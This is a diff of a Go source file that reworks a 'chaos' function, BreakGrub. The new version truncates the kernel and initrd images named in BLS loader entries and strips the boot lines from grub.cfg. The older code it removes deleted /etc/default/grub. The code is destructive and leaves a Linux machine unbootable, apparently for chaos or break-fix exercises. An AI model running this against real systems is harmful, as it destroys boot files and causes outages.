@@ -1,51 +1,77 @@
 package main
 
 import (
-	"fmt"
 	"log"
 	"os"
-	"os/exec"
 	"path/filepath"
 	"strings"
 )
 
 func BreakGrub() {
-	possibleGrubDirs := []string{"/boot/grub2", "/boot/grub"}
-	var grubCfgPath string
+	// Try grub2 first, fallback to grub
+	grubCfgPaths := []string{"/boot/grub2/grub.cfg", "/boot/grub/grub.cfg"}
+	var grubCfg string
 
-	// Try to find grub.cfg in possible locations
-	for _, dir := range possibleGrubDirs {
-		path := fmt.Sprintf("%s/grub.cfg", dir)
+	for _, path := range grubCfgPaths {
 		if _, err := os.Stat(path); err == nil {
-			grubCfgPath = path
+			grubCfg = path
 			break
 		}
 	}
 
-	if grubCfgPath == "" {
-		grubCfgPath = "/boot/grub2/grub.cfg"
-		log.Println("[chaos] No GRUB config found, defaulting to:", grubCfgPath)
-	} else {
-		log.Println("[chaos] Will sabotage grub.cfg at:", grubCfgPath)
+	if grubCfg == "" {
+		log.Println("[chaos] grub.cfg not found — skipping GRUB sabotage")
+		return
 	}
 
-	// Remove /etc/default/grub
-	_ = os.Remove("/etc/default/grub")
+	contents, err := os.ReadFile(grubCfg)
+	if err != nil {
+		log.Println("[chaos] Could not read grub.cfg:", err)
+		return
+	}
 
-	// Remove lines containing 'root=' from grub.cfg
-	if contents, err := os.ReadFile(grubCfgPath); err == nil {
+	// BLS mode?
+	if strings.Contains(string(contents), "blscfg") {
+		log.Println("[chaos] Detected BLS boot mode — sabotaging loader entries")
+
+		entries, err := filepath.Glob("/boot/loader/entries/*.conf")
+		if err != nil || len(entries) == 0 {
+			log.Println("[chaos] No BLS entries found to sabotage")
+			return
+		}
+
+		for _, entry := range entries {
+			content, err := os.ReadFile(entry)
+			if err != nil {
+				continue
+			}
+			lines := strings.Split(string(content), "\n")
+			for _, line := range lines {
+				if strings.HasPrefix(line, "linux") || strings.HasPrefix(line, "initrd") {
+					fields := strings.Fields(line)
+					if len(fields) >= 2 {
+						target := filepath.Join("/boot", strings.TrimPrefix(fields[1], "/"))
+						log.Println("[chaos] Truncating:", target)
+						_ = os.Truncate(target, 0)
+					}
+				}
+			}
+		}
+
+	} else {
+		log.Println("[chaos] Detected Classic GRUB mode — modifying grub.cfg directly")
 		lines := strings.Split(string(contents), "\n")
 		var filtered []string
 		for _, line := range lines {
-			if !strings.Contains(line, "root=") {
+			if !strings.Contains(line, "linux") && !strings.Contains(line, "initrd") && !strings.Contains(line, "root=") {
 				filtered = append(filtered, line)
 			}
 		}
-		_ = os.WriteFile(grubCfgPath, []byte(strings.Join(filtered, "\n")), 0644)
+		err := os.WriteFile(grubCfg, []byte(strings.Join(filtered, "\n")), 0644)
+		if err == nil {
+			log.Println("[chaos] Successfully sabotaged classic grub.cfg")
+		}
 	}
-
-	// Inject simulated kernel error into logs
-	exec.Command("logger", "-p", "err", "Simulated kernel error: This is a test error for demonstration").Run()
 }
 
 func main() {
